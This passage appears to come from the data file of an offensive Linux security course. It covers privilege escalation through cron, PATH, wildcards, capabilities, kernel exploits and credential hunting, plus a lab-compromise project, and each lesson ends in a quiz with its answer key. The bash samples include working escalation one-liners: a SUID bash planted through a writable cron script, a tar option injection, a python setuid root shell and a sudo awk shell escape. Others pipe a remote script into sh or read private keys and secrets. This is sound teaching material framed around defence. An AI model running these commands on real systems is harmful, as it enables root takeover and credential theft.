A subtle one: a root cron/script running something like \`tar czf backup.tar.gz *\` in a directory you can write to — you create files whose *names* are command-line options (\`--checkpoint-action=exec=sh script.sh\`), and \`tar\` interprets them as arguments, running your command as root. Many commands with wildcards can be abused this way.

## The method and the mirror

The method: enumerate what root runs (cron, services, scripts), find any part of it you can influence (a writable file, a bare-name command, a wildcard in a writable dir), and inject your command. And, once more, every one of these is a defensive finding: the defensive Linux track told defenders to make root-run scripts non-writable, use absolute paths, avoid wildcards on untrusted input, and lock down \`/etc/passwd\` — because each is exactly the path you're exploiting here. Offence finds them; defence removes them.`,
      sample: {
        lang: 'bash',
        caption: 'A writable root cron script, and PATH hijacking',
        code: `# find what root runs on a schedule
cat /etc/crontab
#  * * * * * root /opt/backup.sh
ls -la /opt/backup.sh
#  -rwxrwxrwx 1 root root ... /opt/backup.sh   <- WORLD-WRITABLE!

# hijack it: it runs as root every minute
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# wait for the cron to fire, then:
/tmp/rootbash -p        # -p keeps the SUID root -> root shell

# PATH hijack: a root script calls  backup  (no absolute path)
echo '/bin/bash -p' > /tmp/backup; chmod +x /tmp/backup
export PATH=/tmp:$PATH  # your 'backup' is found first when root runs it`,
        output: `# id
uid=0(root) ...
# Root's own scheduled/scripted actions turned against it: a
# writable script, or a command called by bare name with a
# hijackable PATH. Defenders prevent this by making root-run
# scripts non-writable, using absolute paths, and avoiding
# wildcards on untrusted input - the exact mirror of this attack.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A root cron job runs a script that is world-writable. Why is this an immediate privilege-escalation path?',
        options: [
          'Because cron jobs always run as root and cannot be secured',
          'Because a low-privileged user can edit the script’s contents, and when the scheduled job runs it executes that content as root — so adding a reverse shell or a SUID-bash command yields root when the job fires; the fix is to ensure files root executes are not writable by lower-privileged users',
          'Because world-writable files are automatically SUID',
          'Because cron encrypts the script',
        ],
        answer: 1,
        explain:
          'The privilege comes from *who runs the script*, not who owns the file: cron executes it as root on schedule, and if the user can modify its contents they control what root will run. Inserting a command — copy bash and set it SUID, or fire a reverse shell — means the next scheduled execution runs that as root, granting a root shell. This is a specific case of the general pattern "root acts on something the user can influence", and the defensive countermeasure is precisely to ensure any file, script or unit that a privileged process executes is writable only by root, which the defensive Linux track emphasised.',
        hint: 'Who runs the script when the job fires, and who is allowed to change what the script contains?',
      },
    },

    {
      id: 'rlin-a-09',
      title: 'Privilege escalation: kernel and capabilities',
      read: `Two more important Linux escalation categories complete the core set: **kernel exploits** and **Linux capabilities**. Both, like the others, are enumeration-driven and mirror defensive findings.

## Kernel exploits

The kernel runs with the highest privilege, so a vulnerability in it can let a local low-privileged user execute code **as root**. If the target runs an **old, unpatched kernel** with a known local-privilege-escalation (LPE) vulnerability, a public exploit may hand you root directly.

The method:

1. \`uname -a\` / \`uname -r\` — get the exact kernel version.
2. Research known LPE exploits for that version (searchsploit, CVE databases; \`linux-exploit-suggester\` maps a kernel to likely exploits).
3. Assess applicability (architecture, config, whether it's really that version vs a backported patch — the same judgement as any CVE).
4. **Compile and run carefully.**

## The serious caveats

Kernel exploits are a **last resort**, for good reasons:

- **They can crash the system.** A kernel exploit that fails often panics the kernel — on an authorized engagement that can take down a production server, so you weigh it against the rules of engagement (and prefer other paths first).
- **They must match precisely** — architecture, kernel version and sometimes config; the wrong one fails or crashes.
- **Compilation** — you may need to compile the exploit for the target (matching its toolchain), which is fiddly.

So testers exhaust misconfigurations (sudo, SUID, cron, credentials) first, and reach for a kernel exploit when those don't pan out — snapshotting in the lab, and being cautious on real targets. Famous examples (DirtyCoW, DirtyPipe, PwnKit — the last technically a SUID/polkit flaw) show how a single kernel/local flaw can root a huge range of systems.

## Linux capabilities

Capabilities slice root's power into distinct privileges (you met them defensively). A binary can be granted a specific capability without being fully SUID-root — and some capabilities are effectively root:

- \`getcap -r / 2>/dev/null\` — hunt files with capabilities (they're **invisible to a SUID search** and to \`ls -l\`, so this is a separate, essential check).
- **\`cap_setuid\`** on an interpreter (e.g. \`python3\`) lets it call \`setuid(0)\` → root. **\`cap_dac_override\`** bypasses file permissions (read/write any file → edit \`/etc/passwd\`). **\`cap_sys_admin\`** is nearly root.
- GTFOBins lists capability-abuse techniques too — e.g. a Python with \`cap_setuid\` gives root via \`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'\`.

## The complete escalation checklist

You now have the main Linux privilege-escalation categories: **sudo, SUID/GTFOBins, cron/writable files/PATH, credentials, kernel, capabilities**, plus group memberships and NFS root-squash issues. The professional method is to walk the whole checklist systematically (automated by LinPEAS, verified by hand), understanding each finding — and each is a defensive control the blue team should have in place. Kernel and capabilities complete the picture: the kernel is the last resort, capabilities are the invisible one that a SUID-only search misses.`,
      sample: {
        lang: 'bash',
        caption: 'Kernel-version research and the (SUID-invisible) capability hunt',
        code: `# KERNEL: exact version, then map to known local-privesc exploits
uname -r                       # e.g. 3.13.0-24-generic (old)
linux-exploit-suggester.sh     # suggests candidate LPE exploits
# assess applicability; kernel exploits are a LAST resort (can crash)

# CAPABILITIES: invisible to a SUID search and to ls -l
getcap -r / 2>/dev/null`,
        output: `[kernel] possible: CVE-2015-1328 (overlayfs), DirtyCoW ... assess first
[caps]   /usr/bin/python3.8 cap_setuid+ep      <- root via setuid!
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
# id -> uid=0(root)
# cap_setuid = a quiet root backdoor a SUID-only hunt would MISS -
# which is exactly why the defensive track added getcap -r / to audits.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why must a tester run `getcap -r /` as a separate check, in addition to searching for SUID binaries, when hunting Linux privilege-escalation paths?',
        options: [
          'Because getcap is faster than a SUID search',
          'Because Linux capabilities are not shown by a SUID search or by `ls -l`, yet a capability like cap_setuid on an interpreter grants root just as effectively — so a capability-based escalation path is invisible unless you specifically enumerate capabilities',
          'Because capabilities replace the need to check SUID',
          'Because getcap only works after gaining root',
        ],
        answer: 1,
        explain:
          'A SUID search (`find -perm -4000`) finds binaries with the SUID bit, but capabilities are a distinct mechanism: a file can hold a specific capability (e.g. `cap_setuid`) with no SUID bit set and nothing unusual in `ls -l`. Such a capability can be just as powerful — `cap_setuid` on a Python interpreter lets it call `setuid(0)` and spawn a root shell — so a capability-based escalation is completely missed unless you run `getcap -r /` specifically. This is exactly why the defensive Linux track added the capability hunt to host audits alongside the SUID hunt: the two mechanisms require two separate checks.',
        hint: 'Does the SUID bit or `ls -l` reveal a file’s Linux capabilities?',
      },
    },

    {
      id: 'rlin-a-10',
      title: 'Hunting credentials',
      read: `Credentials are the currency of an engagement — found in one place, they unlock another. After any foothold (and continuously), a tester **hunts for credentials**, because a password or key lying on a compromised host often beats any exploit for reaching the next system or escalating.

## Where credentials hide on Linux

- **Configuration files** — web app configs (\`config.php\`, \`.env\`, \`settings.py\`, \`wp-config.php\`), database configs, service configs. Database passwords, API keys and secrets live here constantly. \`grep -ri "password\\|passwd\\|secret\\|api_key" /var/www /etc /opt 2>/dev/null\`.
- **History files** — \`~/.bash_history\`, \`~/.mysql_history\`, and other shells' histories often contain passwords typed on the command line (\`mysql -u root -pSecret\`).
- **SSH keys** — \`~/.ssh/id_rsa\` (and others): a private key is a credential for wherever it's authorized. Also check \`authorized_keys\` (who can log in) and \`known_hosts\` (where this host connects — pivot targets).
- **Files named suggestively** — \`credentials\`, \`passwords.txt\`, \`backup\`, \`.pgpass\`, \`.netrc\`, \`.git-credentials\`.
- **Databases** — once you can read a database (via a found credential), its user tables hold hashes to crack and sometimes plaintext.
- **Memory and process listings** — \`ps aux\` sometimes shows passwords passed as command-line arguments (visible to all users).
- **Backups and archives** — old backups often contain credentials that are still valid.
- **Environment variables** — \`env\`, \`/proc/*/environ\` (secrets injected into processes).

## Cracking and reuse

Hashes you find get **cracked offline** (the password-attacks step); plaintext and keys get **reused**:

- **Password reuse** is rampant — a password found for one service is tried on SSH, other accounts, sudo, other hosts. The single most productive move is often trying a found password everywhere.
- A cracked application-user password may be the admin's actual password, reused for the system.

## Automated help

LinPEAS and similar scripts search many of these locations automatically, flagging likely credentials. But manual, thoughtful searching — knowing where *this* application or service keeps its secrets — finds things automation misses.

## From credential to escalation and movement

Found credentials serve both goals:

- **Escalation** — a root password in a config, or a user password that lets \`sudo\`, escalates you on the current host.
- **Lateral movement** — credentials (or an SSH key) for another host reach systems you couldn't touch from outside (the intermediate-level topic).

## The defensive mirror

This is why the defensive tracks were emphatic: **don't store credentials in configs, history, or code; use secrets managers; don't reuse passwords; protect SSH keys.** Every credential you find on an authorized test is a finding — "the database password is in a world-readable config", "the root password is in bash_history", "the same password works on twelve hosts". Credential hunting demonstrates exactly the risks that secrets management and no-reuse policies address. Offence finds the sprawl; defence eliminates it.`,
      sample: {
        lang: 'bash',
        caption: 'Hunting credentials across the usual hiding places',
        code: `# configs, code, and common secret files
grep -riE 'password|passwd|secret|api_key|token' /var/www /etc /opt 2>/dev/null
# history files (passwords typed on the command line)
cat ~/.bash_history ~/.mysql_history 2>/dev/null
# SSH keys (a private key is a credential) and where this host connects
ls -la ~/.ssh/; cat ~/.ssh/id_rsa 2>/dev/null; cat ~/.ssh/known_hosts
# then: reuse what you find - try it EVERYWHERE`,
        output: `/var/www/config.php:  $db_pass = 'Sup3rSecret!';
~/.bash_history:      mysql -u root -pSup3rSecret!
~/.ssh/id_rsa         (a private key - login to wherever it's authorized)
known_hosts:          10.0.0.20, 10.0.0.21  (pivot targets)
# The SAME password appears in config AND history -> try it for sudo,
# SSH, other users, other hosts. Reuse is the highest-yield move.
# Every find is a defensive finding: secrets in configs, in history,
# and reused - exactly what secrets management and no-reuse prevent.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'After gaining a foothold, why is hunting for credentials often more productive than searching for another exploit?',
        options: [
          'Because exploits never work after the first foothold',
          'Because credentials are frequently left in configs, history files, SSH keys, databases and backups, and people reuse them — so a found password or key often directly escalates privilege or reaches other hosts, with more reliability and less noise than developing another exploit',
          'Because credentials cannot be detected by defenders',
          'Because hunting credentials requires no permission',
        ],
        answer: 1,
        explain:
          'Real systems are littered with credentials — in application and service configs, shell and client history, SSH private keys, databases, environment variables and old backups — and rampant password reuse means one found secret frequently works elsewhere. Using a valid credential to escalate (a root password in a config, a user password that permits sudo) or to move laterally (an SSH key or reused password for another host) is typically more reliable, quieter and simpler than finding and weaponising a new vulnerability. This is precisely why defensive guidance stresses secrets managers and no password reuse: every credential a tester finds this way is a finding those controls would eliminate.',
        hint: 'What is more reliable and quieter: developing a fresh exploit, or logging in with a password you found lying in a config file?',
      },
    },

    {
      id: 'rlin-a-11',
      title: 'Automated enumeration, verified',
      read: `Manual enumeration is thorough but slow; **automated enumeration scripts** walk the whole checklist in seconds and flag likely paths. The amateur skill is using them well — as accelerators you *understand and verify*, not as oracles you blindly trust.

## The tools

- **LinPEAS** — the most popular Linux privilege-escalation enumeration script. It checks essentially everything from the last several steps — sudo rights, SUID/SGID, capabilities, cron, writable files and paths, kernel version, credentials in files, network, and much more — and **colour-codes** findings by how likely they are to be exploitable (red/yellow highlights = high-probability paths).
- **LinEnum**, **linux-smart-enumeration (lse.sh)** — alternatives with similar coverage and different presentations.
- **linux-exploit-suggester** — focuses on mapping the kernel version to candidate exploits.
- **pspy** — watches processes and cron jobs in real time without root, catching scheduled tasks and short-lived processes that a snapshot misses.

## How to use them well

1. **Get the script onto the target** — via your foothold (download it if the target has internet, or transfer it from your attacker box with a simple HTTP server / \`scp\` / paste).
2. **Run it and read the highlights** — start with what it flags as most promising (LinPEAS's red/yellow), but skim the whole output; the key finding is sometimes not the top highlight.
3. **Verify manually and understand** — this is the crucial part. An automated flag is a *lead*, not a confirmed path. Check it yourself, confirm it's real (not a false positive), and understand *why* it's exploitable before acting. Blindly following a script teaches nothing and sometimes chases dead ends.

## Why understanding still matters

Automated tools are pattern-matchers; they can miss context-specific paths (a custom script, an app-specific misconfiguration, a subtle chain) and can flag things that aren't actually exploitable here. The tester who understands the *categories* of escalation (the last several steps) can:

- Interpret the script's output correctly.
- Find paths the script missed.
- Verify and adapt a flagged path that doesn't work exactly as suggested.
- Explain the finding in the report (and its fix).

So the workflow is **automate to find candidates fast, then verify and understand each by hand.** The script accelerates the tedious checklist; your knowledge turns a flag into a confirmed, understood, reportable escalation.

## The defensive symmetry, one more time

Defenders run these *same tools* against their own hosts — LinPEAS is a standard blue-team self-audit precisely because it enumerates every escalation path a defender should close. When you run LinPEAS on an authorized target and it lights up red on a SUID binary or a writable cron script, that is exactly the output a defender wants to see (and fix) on their own systems first. The tool is neutral; the direction of use — find-to-exploit vs find-to-fix — is the only difference.`,
      sample: {
        lang: 'bash',
        caption: 'Run LinPEAS, then verify its highlights by hand',
        code: `# transfer it to the target (e.g. from a python http server on attacker)
#   attacker:  python3 -m http.server 8000
#   target:    curl http://10.10.10.9:8000/linpeas.sh | sh

# read the RED/YELLOW highlights first, then VERIFY each manually:
sudo -l                          # confirm the sudo finding it flagged
ls -la /opt/backup.sh            # confirm the writable-cron finding
getcap -r / 2>/dev/null          # confirm the capability finding`,
        output: `LinPEAS highlights (candidates, not confirmations):
  [95%] sudo NOPASSWD: /usr/bin/find        -> verify with sudo -l  (real)
  [90%] /opt/backup.sh writable + in cron   -> verify perms         (real)
  [80%] python3 cap_setuid                  -> verify with getcap   (real)
  [--]  kernel 3.13 old                     -> assess; last resort
# Each flag VERIFIED and UNDERSTOOD before use. Defenders run the
# SAME script on their hosts to find and FIX these first - the tool
# is neutral; find-to-exploit vs find-to-fix is the only difference.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Automated tools like LinPEAS flag privilege-escalation paths quickly. Why should a tester still verify and understand each flagged finding manually?',
        options: [
          'Because the tools are always wrong',
          'Because an automated flag is a lead, not a confirmed path — it may be a false positive, may not be exploitable in this configuration, and understanding why it works (or doesn’t) is what lets the tester verify it, adapt it, find paths the tool missed, and explain the finding and its fix in the report',
          'Because manual verification makes the tool run faster',
          'Because verifying is required before the tool is legal',
        ],
        answer: 1,
        explain:
          'Enumeration scripts are pattern-matchers that surface candidates fast, but they produce false positives, flag things that are not actually exploitable in the target’s specific configuration, and can miss context-specific paths (a custom script, an app-specific misconfiguration, a subtle chain). Treating a highlight as a confirmed escalation leads to wasted effort on dead ends and teaches nothing reusable. Verifying each by hand and understanding the underlying mechanism lets the tester confirm what is real, adapt a path that does not work exactly as suggested, spot what the tool overlooked, and write a report that explains both the finding and its remediation — which is also how defenders use the identical tool to find and fix these paths first.',
        hint: 'Is a highlighted finding a proven root, or a candidate you still have to confirm and understand?',
      },
    },

    {
      id: 'rlin-a-12',
      title: 'Project: full compromise of a lab host',
      read: `Bring the level together into the exercise that consolidates offensive Linux fundamentals: take an intermediate vulnerable machine **in your lab** (or an authorized platform box) and drive it from external scan to **full root**, thoroughly and with understanding.

## The exercise

Choose a machine rated beginner-to-intermediate (VulnHub, or a TryHackMe / Hack The Box box), and work the full methodology:

1. **Enumerate the network** — find and full-port-scan the target with version detection (\`nmap -sVC -p-\`). Record every service and version.
2. **Enumerate each service deeply** — apply per-protocol tools (SMB, FTP, SNMP, databases) and, for web, full content discovery (directories, files, vhosts, source). Research each version for known vulnerabilities and default/weak credentials. Follow every thread.
3. **Gain a foothold** — from the enumeration, identify and use a way in: a vulnerable service, a web flaw, weak/default credentials, or an exposed secret. Understand why it works. Catch and **stabilise** your shell.
4. **Establish situational awareness** — \`id\`, \`uname -a\`, \`sudo -l\`, network, and begin credential hunting.
5. **Escalate to root** — walk the escalation checklist (automated with LinPEAS, verified by hand): sudo, SUID/GTFOBins, cron/writable files/PATH, credentials, capabilities, kernel. Find a path, understand it, use it.
6. **Loot and document** — gather the proof (flags, if a CTF box; evidence of impact otherwise), and write it up.

## Do it professionally

- **Enumerate before exploiting** — resist the urge to fire exploits early; the way in is in the enumeration. When stuck, enumerate *more*, don't throw more exploits.
- **Notes throughout** — every command, finding, credential and step. They become the report and let you reproduce the path.
- **Understand every step** — foothold and escalation alike. The understanding is the transferable skill and the basis of the report (and of defending against it).
- **Chain findings** — a username here unlocks a login there; a config credential escalates; a cracked hash reaches another account. Real compromise is chained, not a single magic bug.
- **Stay authorized** — your lab or a platform that permits it. Always.

## The measure of success

You can take an authorized, unfamiliar Linux target from an external scan to root by systematic enumeration, a well-understood foothold, and a verified privilege-escalation path — chaining findings, keeping notes, and understanding every step — and produce a report a defender could act on.

> The level distilled: offensive Linux is **deep enumeration** (network, service, web, host) feeding a **researched foothold** (known vuln, weak credential, or misconfiguration) and a **methodical privilege escalation** (sudo, SUID/GTFOBins, cron/writable/PATH, credentials, capabilities, kernel), with credentials as the currency that chains it together — all understood, documented, and performed only on systems you own or are authorized to test. Every path you exploit is a defensive finding in reverse; the intermediate level goes deeper into escalation, post-exploitation and pivoting, but this end-to-end compromise, done thoughtfully, is the offensive Linux core.`,
      sample: {
        lang: 'text',
        caption: 'A chained compromise, notes-becoming-report',
        code: `[enum]     nmap -sVC -p- -> 22 ssh, 80 Apache, 445 Samba, 3306 mysql
[enum-web] ffuf -> /backup.zip (200), /.git (301)  -> git leaked source
[enum-smb] enum4linux -> users: jsmith, svc-web; share 'transfer' (RW)
[creds]    source in /backup.zip -> db_pass 'Spr1ng!' in config.php
[reuse]    'Spr1ng!' works for SSH as jsmith  -> stable shell (low priv)
[situational] sudo -l: (root) NOPASSWD /usr/bin/awk
[escalate] sudo awk 'BEGIN{system("/bin/sh")}'  -> # id -> uid=0(root)
[report]   1. Source disclosure via /backup.zip + /.git (High)
           2. Reused DB password permits SSH (High)
           3. sudo awk misconfig -> root (High)
           each with reproduction, impact, remediation.`,
        output: `Deep enumeration -> a credential chain (leaked source -> DB pass ->
reused for SSH) -> a verified sudo escalation to root. Findings
CHAINED, notes throughout, every step understood, done in the lab.
That systematic, legal, end-to-end compromise - and the report it
produces - is the offensive Linux core, and each step is a
defensive fix waiting to be written.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In a realistic compromise, why is "chaining findings" (a username here, a reused credential there, a config secret, a sudo misconfig) more representative than finding a single exploit?',
        options: [
          'Because single exploits are illegal',
          'Because real compromise usually links several individually-minor findings into a path — enumeration yields a credential that grants a foothold, which reveals another credential that escalates — so the ability to connect discoveries across the engagement, rather than relying on one magic vulnerability, is what actually reaches the goal',
          'Because chaining avoids the need to enumerate',
          'Because a single exploit can never give root',
        ],
        answer: 1,
        explain:
          'Genuine engagements rarely turn on one dramatic vulnerability; they turn on connecting a sequence of ordinary findings — a leaked source archive reveals a database password, which is reused for SSH, which lands a low-privileged shell, where a sudo misconfiguration grants root. Each finding alone might seem minor, but linked they form the path to the objective. This is why thorough enumeration (which produces the raw findings), meticulous notes (which let you connect them), and understanding (which lets you see what each enables) matter so much, and it is exactly the layered, defence-in-depth failure that defenders aim to prevent by closing every link.',
        hint: 'Does one bug usually reach the goal, or does connecting several smaller discoveries?',
      },
    },
  ],
}

export default level
